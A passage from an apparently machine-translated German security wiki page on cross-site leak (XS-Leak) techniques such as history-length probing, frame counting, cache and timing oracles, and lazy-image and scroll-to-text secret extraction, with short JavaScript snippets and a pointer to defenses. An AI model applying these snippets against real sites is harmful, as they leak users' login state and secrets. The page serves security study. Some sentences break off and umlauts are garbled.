F√ºr diese Art von Angriff ist normalerweise `SameSite=None` oder die gleiche Kontext erforderlich.

### URL-Maximall√§nge - Clientseitig

* **Inclusion Methods**: Pop-ups
* **Erkennbarer Unterschied**: Statuscode / Inhalt
* **Weitere Informationen**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Zusammenfassung**: Unterschiede in den Antworten aufgrund der L√§nge der Umleitungsantwort k√∂nnen dazu f√ºhren, dass eine Anfrage zu gro√ü ist und ein Unterschied bemerkt werden kann.
* **Codebeispiel**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

Gem√§√ü der [Chromium-Dokumentation](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length) betr√§gt die maximale URL-L√§nge in Chrome 2 MB.

> Im Allgemeinen gibt es im _Web-Plattform_ keine Begrenzung f√ºr die L√§nge von URLs (obwohl 2^31 eine h√§ufig
### Maximale Weiterleitungen

* **Inklusionsmethoden**: Fetch API, Frames
* **Unterscheidbarer Unterschied**: Statuscode
* **Weitere Informationen**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Zusammenfassung:** Verwenden Sie die Begrenzung der Weiterleitungen des Browsers, um das Auftreten von URL-Weiterleitungen festzustellen.
* **Codebeispiel**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Wenn die **maximale** Anzahl der **Weiterleitungen**, denen ein Browser folgen kann, **20** betr√§gt, k√∂nnte ein Angreifer versuchen, seine Seite mit **19 Weiterleitungen** zu laden und schlie√ülich das Opfer zur getesteten Seite zu **senden**. Wenn ein **Fehler** ausgel√∂st wird, hat die Seite versucht, das Opfer **weiterzuleiten**.

### Verlaufsl√§nge

* **Inklusionsmethoden**: Frames, Pop-ups
* **Unterscheidbarer Unterschied**: Weiterleitungen
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Zusammenfassung:** JavaScript-Code manipuliert den Browserverlauf und kann √ºber die Eigenschaft "length" darauf zugegriffen werden.
* **Codebeispiel**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

Die **History API** erm√∂glicht es JavaScript-Code, den Browserverlauf zu manipulieren, der die vom Benutzer besuchten Seiten speichert. Ein Angreifer kann die Eigenschaft "length" als Inklusionsmethode verwenden, um JavaScript- und HTML-Navigation zu erkennen.\
√úberpr√ºfen Sie `history.length`, lassen Sie den Benutzer zu einer Seite **navigieren**, √§ndern Sie sie **zur√ºck** zur gleichen Herkunft und √ºberpr√ºfen Sie den neuen Wert von `history.length`.

### Verlaufsl√§nge mit gleicher URL

* **Inklusionsmethoden**: Frames, Pop-ups
* **Unterscheidbarer Unterschied**: Wenn die URL mit der vermuteten √ºbereinstimmt
* **Zusammenfassung:** Es ist m√∂glich zu erraten, ob sich der Ort eines Frames/Pop-ups in einer bestimmten URL befindet, indem die Verlaufsl√§nge missbraucht wird.
* **Codebeispiel**: Unten

Ein Angreifer k√∂nnte JavaScript-Code verwenden, um den Ort des Frames/Pop-ups auf eine vermutete URL zu **manipulieren** und ihn **sofort** auf `about:blank` **√§ndern**. Wenn die Verlaufsl√§nge zunimmt, bedeutet dies, dass die URL korrekt war und Zeit hatte, **zuzunehmen, da die URL nicht neu geladen wird, wenn sie gleich ist**. Wenn sie nicht zunimmt, bedeutet dies, dass sie versucht hat, die vermutete URL zu laden, aber weil wir **sofort danach** `about:blank` geladen haben, hat die Verlaufsl√§nge **nie zugenommen**, als die vermutete URL geladen wurde.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Frame-Z√§hlung

* **Inklusionsmethoden**: Frames, Pop-ups
* **Nachweisbarer Unterschied**: Seitenelemente
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Zusammenfassung**: Bewertung der Anzahl von `iframe`-Elementen durch Inspektion der Eigenschaft `window.length`.
* **Codebeispiel**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Das Z√§hlen der **Anzahl von Frames** in einer √ºber `iframe` oder `window.open` ge√∂ffneten Webseite kann helfen, den **Status des Benutzers auf dieser Seite** zu identifizieren.\
Dar√ºber hinaus kann durch kontinuierliche √úberpr√ºfung der Anzahl von Frames ein **Muster** identifiziert werden, das Informationen preisgeben k√∂nnte, wenn die Seite immer die gleiche Anzahl von Frames hat.

Ein Beispiel f√ºr diese Technik ist, dass in Chrome ein **PDF** mit Hilfe der **Frame-Z√§hlung** erkannt werden kann, da intern ein `embed` verwendet wird. Es gibt [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113), die eine gewisse Kontrolle √ºber den Inhalt erm√∂glichen, wie z.B. `zoom`, `view`, `page`, `toolbar`, wo diese Technik interessant sein k√∂nnte.

### HTMLElemente

* **Inklusionsmethoden**: HTML-Elemente
* **Nachweisbarer Unterschied**: Seitenelemente
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Zusammenfassung**: Gelesener Wert zur Unterscheidung zwischen 2 m√∂glichen Zust√§nden
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Informationen, die durch HTML-Elemente preisgegeben werden, sind ein Anliegen in der Web-Sicherheit, insbesondere wenn dynamische Medieninhalte basierend auf Benutzerinformationen generiert werden oder wenn Wasserzeichen hinzugef√ºgt werden, die die Gr√∂√üe des Mediums ver√§ndern. Dies kann von Angreifern ausgenutzt werden, um zwischen m√∂glichen Zust√§nden zu unterscheiden, indem die von bestimmten HTML-Elementen preisgegebenen Informationen analysiert werden.

### Durch HTML-Elemente preisgegebene Informationen

- **HTMLMediaElement**: Dieses Element gibt die `duration` und `buffered`-Zeiten des Mediums preis, auf die √ºber seine API zugegriffen werden kann.
[Weitere Informationen zum HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
- **HTMLVideoElement**: Es gibt `videoHeight` und `videoWidth` preis. In einigen Browsern stehen zus√§tzliche Eigenschaften wie `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` und `webkitDecodedFrameCount` zur Verf√ºgung, die detailliertere Informationen √ºber den Medieninhalt bieten.
[Weitere Informationen zum HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
- **getVideoPlaybackQuality()**: Diese Funktion liefert Details zur Video-Wiedergabequalit√§t, einschlie√ülich `totalVideoFrames`, das die Menge der verarbeiteten Videodaten anzeigen kann.
[Weitere Informationen zu getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
- **HTMLImageElement**: Dieses Element gibt die `height` und `width` eines Bildes preis. Wenn ein Bild jedoch ung√ºltig ist, geben diese Eigenschaften 0 zur√ºck und die Funktion `image.decode()` wird abgelehnt, was auf das fehlerhafte Laden des Bildes hinweist.
[Weitere Informationen zum HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)


### CSS-Eigenschaft

* **Inklusionsmethoden**: HTML-Elemente
* **Nachweisbarer Unterschied**: Seitenelemente
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Zusammenfassung**: Identifizierung von Variationen im Website-Styling, die mit dem Zustand oder Status des Benutzers korrelieren.
* **Codebeispiel**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Webanwendungen k√∂nnen das **Website-Styling** je nach Status des Benutzers √§ndern. Cross-Origin-CSS-Dateien k√∂nnen mit dem **HTML-Link-Element** in der Angreiferseite eingebettet werden und die **Regeln** werden auf die Angreiferseite angewendet. Wenn eine Seite diese Regeln dynamisch √§ndert, kann ein Angreifer diese Unterschiede abh√§ngig vom Benutzerzustand **erkennen**.\
Als Leck-Technik kann der Angreifer die Methode `window.getComputedStyle` verwenden, um CSS-Eigenschaften eines bestimmten HTML-Elements zu **lesen**. Dadurch kann ein Angreifer beliebige CSS-Eigenschaften lesen, wenn das betroffene Element und der Eigenschaftsname bekannt sind.

### CSS-Verlauf

* **Inklusionsmethoden**: HTML-Elemente
* **Nachweisbarer Unterschied**: Seitenelemente
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Zusammenfassung**: Erkennen, ob der `:visited`-Stil auf eine URL angewendet wird, was darauf hinweist, dass sie bereits besucht wurde.
* **Codebeispiel**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
Laut [**diesem**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/) funktioniert dies nicht in headless Chrome.
{% endhint %}

Der CSS-Selektor `:visited` wird verwendet, um URLs anders zu gestalten, wenn sie vom Benutzer bereits besucht wurden. Fr√ºher konnte die Methode `getComputedStyle()` verwendet werden, um diese Stilunterschiede zu identifizieren. Moderne Browser haben jedoch Sicherheitsma√ünahmen implementiert, um zu verhindern, dass diese Methode den Zustand eines Links preisgibt. Dazu geh√∂rt die R√ºckgabe des berechneten Stils immer so, als ob der Link besucht worden w√§re, und die Beschr√§nkung der Stile, die mit dem `:visited`-Selektor angewendet werden k√∂nnen.

Trotz dieser Einschr√§nkungen ist es m√∂glich, den besuchten Zustand eines Links indirekt zu erkennen. Eine Technik besteht darin, den Benutzer dazu zu bringen, mit einem von CSS betroffenen Bereich zu interagieren, indem speziell die Eigenschaft `mix-blend-mode` verwendet wird. Diese Eigenschaft erm√∂glicht das Mischen von Elementen mit ihrem Hintergrund und kann den besuchten Zustand basierend auf der Benutzerinteraktion offenbaren.

Dar√ºber hinaus kann die Erkennung ohne Benutzerinteraktion durch Ausnutzen der Rendertiming von Links erreicht werden. Da Browser besuchte und nicht besuchte Links m√∂glicherweise unterschiedlich rendern, kann dies einen messbaren Zeitunterschied in der Darstellung erzeugen. In einem Chromium-Bug-Bericht wurde ein Proof of Concept (PoC) erw√§hnt, der diese Technik mit mehreren Links verwendet, um den Timing-Unterschied zu verst√§rken und so den besuchten Zustand durch Timing-Analyse erkennbar zu machen.

F√ºr weitere Details zu diesen Eigenschaften und Methoden besuchen Sie ihre Dokumentationsseiten:
- `:visited`: [MDN-Dokumentation](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
- `getComputedStyle()`: [MDN-Dokumentation](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
- `mix-blend-mode`: [MDN-Dokumentation](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)
### ContentDocument X-Frame-Leak

* **Inklusionsmethoden**: Frames
* **Nachweisbarer Unterschied**: Header
* **Weitere Informationen**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Zusammenfassung**: In Google Chrome wird eine dedizierte Fehlerseite angezeigt, wenn eine Seite aufgrund von X-Frame-Options-Einschr√§nkungen nicht in eine Cross-Origin-Site eingebettet werden kann.
* **Codebeispiel**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

In Chrome wird bei einer Seite mit dem `X-Frame-Options`-Header, der auf "deny" oder "same-origin" gesetzt ist, wenn sie als Objekt eingebettet wird, eine Fehlerseite angezeigt. Chrome gibt ein leeres Dokumentobjekt (anstelle von `null`) f√ºr die `contentDocument`-Eigenschaft dieses Objekts zur√ºck, im Gegensatz zu iframes oder anderen Browsern. Angreifer k√∂nnten dies ausnutzen, indem sie das leere Dokument erkennen und m√∂glicherweise Informationen √ºber den Zustand des Benutzers preisgeben, insbesondere wenn Entwickler den X-Frame-Options-Header inkonsistent setzen und Fehlerseiten oft √ºbersehen. Das Bewusstsein f√ºr und die konsequente Anwendung von Sicherheitsheadern sind entscheidend, um solche Lecks zu verhindern.


### Download-Erkennung

* **Inklusionsmethoden**: Frames, Pop-ups
* **Nachweisbarer Unterschied**: Header
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Zusammenfassung**: Ein Angreifer kann Dateidownloads erkennen, indem er iframes nutzt; die fortgesetzte Zug√§nglichkeit des iframes deutet auf einen erfolgreichen Dateidownload hin.
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

Der `Content-Disposition`-Header, insbesondere `Content-Disposition: attachment`, weist den Browser an, den Inhalt herunterzuladen anstatt ihn inline anzuzeigen. Dieses Verhalten kann ausgenutzt werden, um festzustellen, ob ein Benutzer Zugriff auf eine Seite hat, die einen Dateidownload ausl√∂st. In Chromium-basierten Browsern gibt es einige Techniken, um dieses Download-Verhalten zu erkennen:

1. **√úberwachung der Download-Leiste**:
- Wenn in Chromium-basierten Browsern eine Datei heruntergeladen wird, erscheint am unteren Rand des Browserfensters eine Download-Leiste.
- Durch √úberwachung von √Ñnderungen in der Fensterh√∂he k√∂nnen Angreifer darauf schlie√üen, dass die Download-Leiste erscheint und somit ein Download initiiert wurde.

2. **Download-Navigation mit Iframes**:
- Wenn eine Seite einen Dateidownload mit dem `Content-Disposition: attachment`-Header ausl√∂st, f√ºhrt dies nicht zu einem Navigationsereignis.
- Durch Laden des Inhalts in einem iframe und √úberwachung von Navigationsereignissen ist es m√∂glich zu √ºberpr√ºfen, ob die Content-Disposition einen Dateidownload verursacht (keine Navigation) oder nicht.

3. **Download-Navigation ohne Iframes**:
- √Ñhnlich wie bei der iframe-Technik wird bei dieser Methode `window.open` anstelle eines iframes verwendet.
- Durch √úberwachung von Navigationsereignissen im neu ge√∂ffneten Fenster kann festgestellt werden, ob ein Dateidownload ausgel√∂st wurde (keine Navigation) oder ob der Inhalt inline angezeigt wird (Navigation erfolgt).

In Szenarien, in denen nur angemeldete Benutzer solche Downloads ausl√∂sen k√∂nnen, k√∂nnen diese Techniken verwendet werden, um den Authentifizierungszustand des Benutzers indirekt anhand der Reaktion des Browsers auf die Download-Anfrage abzuleiten.

### Partitioned HTTP Cache Bypass <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Inklusionsmethoden**: Pop-ups
* **Nachweisbarer Unterschied**: Timing
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Zusammenfassung**: Ein Angreifer kann Dateidownloads erkennen, indem er iframes nutzt; die fortgesetzte Zug√§nglichkeit des iframes deutet auf einen erfolgreichen Dateidownload hin.
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (von [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Deshalb ist diese Technik interessant: Chrome hat jetzt **Cache-Partitionierung**, und der Cache-Schl√ºssel der neu ge√∂ffneten Seite lautet: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)`, aber wenn ich eine ngrok-Seite √∂ffne und fetch darin verwende, wird der Cache-Schl√ºssel sein: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, der **Cache-Schl√ºssel ist unterschiedlich**, sodass der Cache nicht geteilt werden kann. Weitere Details finden Sie hier: [Gaining security and privacy by partitioning the cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Kommentar von [**hier**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Wenn eine Website `example.com` eine Ressource von `*.example.com/resource` einbindet, hat diese Ressource denselben Caching-Schl√ºssel wie wenn die Ressource direkt √ºber eine Top-Level-Navigation angefordert w√ºrde. Das liegt daran, dass der Caching-Schl√ºssel aus dem Top-Level-_eTLD+1_ und dem Frame-_eTLD+1_ besteht.

Da der Zugriff auf den Cache schneller ist als das Laden einer Ressource, ist es m√∂glich, zu versuchen, den Ort einer Seite zu √§ndern und ihn 20 ms (zum Beispiel) sp√§ter abzubrechen. Wenn sich die Herkunft nach dem Abbruch ge√§ndert hat, bedeutet dies, dass die Ressource im Cache gespeichert wurde.\
Oder es kann einfach **ein fetch an die potenziell gecachte Seite gesendet und die Zeit gemessen werden**, die es dauert.

### Manuelle Weiterleitung <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inklusionsmethoden**: Fetch API
* **Nachweisbarer Unterschied**: Weiterleitungen
* **Weitere Informationen**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Zusammenfassung**: Es ist m√∂glich festzustellen, ob eine Antwort auf eine fetch-Anfrage eine Weiterleitung ist.
* **Codebeispiel**:

![](<../.gitbook/assets/image (652).png>)

### Fetch mit AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inklusionsmethoden**: Fetch API
* **Nachweisbarer Unterschied**: Timing
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Zusammenfassung**: Es ist m√∂glich, zu versuchen, eine Ressource zu laden und den Ladevorgang abzubrechen, bevor er abgeschlossen ist. Abh√§ngig davon, ob ein Fehler ausgel√∂st wird, wurde die Ressource im Cache gespeichert oder nicht.
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Verwenden Sie _**fetch**_ und _**setTimeout**_ mit einem **AbortController**, um sowohl festzustellen, ob die **Ressource im Cache gespeichert ist**, als auch eine bestimmte Ress
### Skript-Verschmutzung

* **Einbindungsmethoden**: HTML-Elemente (Skript)
* **Erkennbarer Unterschied**: Seiteninhalt
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Zusammenfassung**: Es ist m√∂glich, **eingebaute Funktionen zu √ºberschreiben** und deren Argumente zu lesen, selbst von einem **cross-origin Skript** (das nicht direkt gelesen werden kann). Dadurch kann m√∂glicherweise **wertvolle Informationen preisgegeben** werden.
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

* **Einbindungsmethoden**: Pop-ups
* **Erkennbarer Unterschied**: Seiteninhalt
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Zusammenfassung**: Messen Sie die Ausf√ºhrungszeit einer Webseite mithilfe von Service Workern.
* **Codebeispiel**:

In dem gegebenen Szenario ergreift der Angreifer die Initiative, um einen **Service Worker** in einer seiner Domains, speziell "attacker.com", zu registrieren. Anschlie√üend √∂ffnet der Angreifer ein neues Fenster auf der Zielwebsite vom Hauptdokument aus und weist den **Service Worker** an, einen Timer zu starten. W√§hrend das neue Fenster geladen wird, navigiert der Angreifer √ºber den in Schritt zwei erhaltenen Verweis zu einer von dem **Service Worker** verwalteten Seite.

Bei Ankunft der in Schritt zuvor initiierten Anfrage antwortet der **Service Worker** mit einem **204 (No Content)**-Statuscode, wodurch der Navigationsprozess effektiv beendet wird. Zu diesem Zeitpunkt erfasst der **Service Worker** eine Messung des zuvor in Schritt zwei gestarteten Timers. Diese Messung wird von der Dauer des JavaScripts beeinflusst, das Verz√∂gerungen im Navigationsprozess verursacht.

{% hint style="warning" %}
Bei einer Ausf√ºhrungszeitmessung ist es m√∂glich, **Netzwerkfaktoren** zu **eliminieren**, um **genauere Messungen** zu erhalten. Zum Beispiel, indem die Ressourcen, die von der Seite verwendet werden, vor dem Laden der Seite geladen werden.
{% endhint %}

### Fetch-Zeitmessung

* **Einbindungsmethoden**: Fetch API
* **Erkennbarer Unterschied**: Zeitmessung (in der Regel aufgrund des Seiteninhalts, des Statuscodes)
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Zusammenfassung**: Verwenden Sie [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow), um die Zeit zu messen, die f√ºr eine Anfrage ben√∂tigt wird. Es k√∂nnen auch andere Uhren verwendet werden.
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Cross-Window-Zeitmessung

* **Einbindungsmethoden**: Pop-ups
* **Erkennbarer Unterschied**: Zeitmessung (in der Regel aufgrund des Seiteninhalts, des Statuscodes)
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Zusammenfassung**: Verwenden Sie [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow), um die Zeit zu messen, die f√ºr eine Anfrage mit `window.open` ben√∂tigt wird. Es k√∂nnen auch andere Uhren verwendet werden.
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterst√ºtzt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Mit HTML- oder Re-Injection

Hier finden Sie Techniken, um Informationen aus einer Cross-Origin-HTML zu exfiltrieren, indem Sie HTML-Inhalte einf√ºgen. Diese Techniken sind interessant in F√§llen, in denen Sie aus irgendeinem Grund HTML einf√ºgen k√∂nnen, aber keinen JS-Code einf√ºgen k√∂nnen.

### H√§ngende Markup

{% content-ref url="dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Lazy Loading von Bildern

Wenn Sie Inhalte **exfiltrieren** m√ºssen und Sie **HTML vor dem Geheimnis hinzuf√ºgen k√∂nnen**, sollten Sie die **√ºblichen Techniken f√ºr h√§ngendes Markup** √ºberpr√ºfen.\
Wenn Sie jedoch aus irgendeinem Grund **Zeichen f√ºr Zeichen** vorgehen m√ºssen (vielleicht erfolgt die Kommunikation √ºber einen Cache-Treffer), k√∂nnen Sie diesen Trick verwenden.

**Bilder** in HTML haben ein "**loading**"-Attribut, dessen Wert "**lazy**" sein kann. In diesem Fall wird das Bild geladen, wenn es angezeigt wird und nicht w√§hrend die Seite geladen wird:
```html
<img src=/something loading=lazy >
```
Daher k√∂nnen Sie **eine Menge Junk-Zeichen hinzuf√ºgen** (zum Beispiel **Tausende von "W"**) um die Webseite **vor dem Geheimnis zu f√ºllen oder etwas wie** `<br><canvas height="1850px"></canvas><br>` hinzuf√ºgen.\
Dann, wenn zum Beispiel unsere **Injection vor der Flagge erscheint**, wird das **Bild geladen**, aber wenn es **nach der Flagge erscheint**, wird die Flagge + der Junk **das Laden verhindern** (Sie m√ºssen mit der Menge an Junk spielen, die platziert werden soll). Dies ist in [**diesem Writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) passiert.

Eine andere Option w√§re die Verwendung des **Scroll-to-text-fragment**, sofern erlaubt:

#### Scroll-to-text-fragment

Sie k√∂nnen jedoch den **Bot dazu bringen, die Seite** mit etwas wie zu √∂ffnen
```
#:~:text=SECR
```
Die Webseite wird ungef√§hr so aussehen: **`https://victim.com/post.html#:~:text=SECR`**

Wo post.html den Angreifer-Junk-Code und das Lazy-Load-Bild enth√§lt und dann das Geheimnis des Bots hinzugef√ºgt wird.

Was dieser Text bewirkt, ist, dass der Bot auf jeden Text auf der Seite zugreift, der den Text `SECR` enth√§lt. Da dieser Text das Geheimnis ist und direkt **unter dem Bild liegt**, wird das **Bild nur geladen, wenn das geratene Geheimnis korrekt ist**. So haben Sie Ihr Orakel, um das Geheimnis Zeichen f√ºr Zeichen **auszulesen**.

Einige Codebeispiele, um dies auszunutzen: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Zeitbasiertes Lazy Loading von Bildern

Wenn es **nicht m√∂glich ist, ein externes Bild zu laden**, das dem Angreifer anzeigen k√∂nnte, dass das Bild geladen wurde, w√§re eine andere Option, **das Zeichen mehrmals zu raten und die Zeit zu messen**. Wenn das Bild geladen wird, dauern alle Anfragen l√§nger als wenn das Bild nicht geladen wird. Dies wurde in der [**L√∂sung dieses Writeups**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) verwendet, **wie hier zusammengefasst**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Wenn `jQuery(location.hash)` verwendet wird, ist es m√∂glich, √ºber die Zeit festzustellen, **ob bestimmter HTML-Inhalt vorhanden ist**, dies liegt daran, dass, wenn der Selektor `main[id='site-main']` nicht √ºbereinstimmt, der Rest der **Selektoren nicht √ºberpr√ºft werden muss**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### CSS-Injection

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## Verteidigung

Es gibt Empfehlungen zur Abwehr in [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) sowie in jedem Abschnitt des Wikis [https://xsleaks.dev/](https://xsleaks.dev/). Schauen Sie dort nach weiteren Informationen dar√ºber, wie Sie sich gegen diese Techniken sch√ºtzen k√∂nnen.

## Referenzen

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

